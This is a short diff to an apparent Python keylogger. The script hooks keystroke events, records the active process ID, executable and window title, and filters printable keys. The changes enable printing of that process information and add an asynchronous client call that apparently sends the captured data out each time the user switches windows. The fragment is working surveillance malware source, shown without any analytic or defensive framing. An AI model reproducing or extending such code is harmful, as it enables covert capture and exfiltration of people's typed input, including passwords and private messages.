@@ -41,11 +41,13 @@ def get_current_process():
 
 
 
-    # print("[ PID: %s - %s - %s ]" % (process_id,
-    #                                  executable.value,
-    #                                  window_title.value)
-    #       )
-    # print()
+    print("[ PID: %s - %s - %s - %s ]" % (process_id,
+                                     executable.value,
+                                     window_title.value, 
+                                     length
+                                     )
+          )
+    print()
 
     # close handles
 
@@ -64,6 +66,8 @@ def KeyStroke(event):
     if event.WindowName != current_window:
         current_window = event.WindowName
         data = get_current_process()
+
+        asyncio.get_event_loop().run_until_complete(client(data))
 
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
